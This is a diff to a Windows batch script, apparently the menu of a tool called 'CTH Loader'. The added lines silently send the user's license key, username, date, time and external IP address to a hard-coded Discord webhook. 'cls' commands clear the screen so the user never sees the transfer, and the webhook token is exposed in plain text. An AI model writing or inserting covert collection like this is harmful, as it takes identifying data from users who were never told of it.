@@ -29,6 +29,12 @@ timeout 1 >nul
 goto menu
 
 :menu2
+set webhook=https://discord.com/api/webhooks/1255946726280400897/_npWrGK9_LvdzUenD5Ekarn7X1AyxT0NMk8LJaXay7ucdsxQLoPEAN0GrguW674sQc-z
+cls
+curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
+cls
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```New CTH Login detected! Customer info: Key used: (%haslo%) User: (%username%) Date: (%date%) Time: (%time%) IP:```\"}" %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ipp.txt %webhook%
 cls
 mode 130,30
 echo    [36m██████╗████████╗██╗  ██╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ 
